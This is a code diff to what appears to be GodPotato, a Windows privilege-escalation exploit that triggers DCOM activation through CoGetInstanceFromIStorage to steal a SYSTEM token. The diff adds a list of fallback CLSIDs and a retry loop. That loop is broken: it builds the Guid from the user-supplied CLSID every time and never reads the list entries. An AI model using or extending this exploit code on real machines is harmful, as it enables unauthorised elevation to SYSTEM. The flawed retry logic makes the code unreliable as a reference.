@@ -5,6 +5,7 @@ using static GodPotato.NativeAPI.NativeMethods;
 using System.Security.Principal;
 using SharpToken;
 using static GodPotato.ArgsParse;
+using System.Collections.Generic;
 
 namespace GodPotato
 {
@@ -90,6 +91,21 @@ namespace GodPotato
                 }
             }
 
+            List<string> clsids = new List<string>
+            {
+                "4991d34b-80a1-4291-83b6-3328366b9097",//bits
+                "F20DA720-C02F-11CE-927B-0800095AE340",//Package
+                "A47979D2-C419-11D9-A5B4-001185AD2B89",//Network List Manager
+                "682159D9-C321-47CA-B3F1-30E36B2EC8B9"//explorer.exe
+            };
+
+
+            potatoArgs.clsid = potatoArgs.clsid.ToLower();
+            if (clsids.Contains(potatoArgs.clsid))
+            {
+                clsids.Remove(potatoArgs.clsid);
+            }
+            clsids.Insert(0, potatoArgs.clsid);
 
 
 
@@ -107,22 +123,30 @@ namespace GodPotato
                 ConsoleWriter.WriteLine("[*] Start PipeServer");
                 godPotatoContext.Start();
 
-                Guid comGuid = new Guid(potatoArgs.clsid);
-
-                MULTI_QI[] qis = new MULTI_QI[1];
-                qis[0].pIID = NativeMethods.GuidToPointer(IUnknownGuid);
-                IStorage storage = CreateIStorage();
-                GodPotatoStorageTrigger storageTrigger = new GodPotatoStorageTrigger(storage, godPotatoContext);
-                try
+                for (int i = 0; i < clsids.Count; i++)
                 {
-                    ConsoleWriter.WriteLine("[*] Trigger RPCS CLSID: " + comGuid);
+                    Guid comGuid = new Guid(potatoArgs.clsid);
 
-                    int hr = CoGetInstanceFromIStorage(null, ref comGuid, null, CLSCTX.LOCAL_SERVER, storageTrigger, 1, qis);
-                    ConsoleWriter.WriteLine("[*] CoGetInstanceFromIStorage: 0x{0:x}" ,hr);
-                }
-                catch (Exception e)
-                {
-                    ConsoleWriter.WriteLine(e);
+                    MULTI_QI[] qis = new MULTI_QI[1];
+                    qis[0].pIID = NativeMethods.GuidToPointer(IUnknownGuid);
+                    IStorage storage = CreateIStorage();
+                    GodPotatoStorageTrigger storageTrigger = new GodPotatoStorageTrigger(storage, godPotatoContext);
+                    try
+                    {
+                        ConsoleWriter.WriteLine("[*] Trigger RPCS CLSID: " + comGuid);
+
+                        int hr = CoGetInstanceFromIStorage(null, ref comGuid, null, CLSCTX.LOCAL_SERVER, storageTrigger, 1, qis);
+                        ConsoleWriter.WriteLine("[*] CoGetInstanceFromIStorage: 0x{0:x}", hr);
+                    }
+                    catch (Exception e)
+                    {
+                        ConsoleWriter.WriteLine(e);
+                    }
+
+                    if (godPotatoContext.GetToken() != null)
+                    {
+                        break;
+                    }
                 }
 
                 WindowsIdentity systemIdentity = godPotatoContext.GetToken();
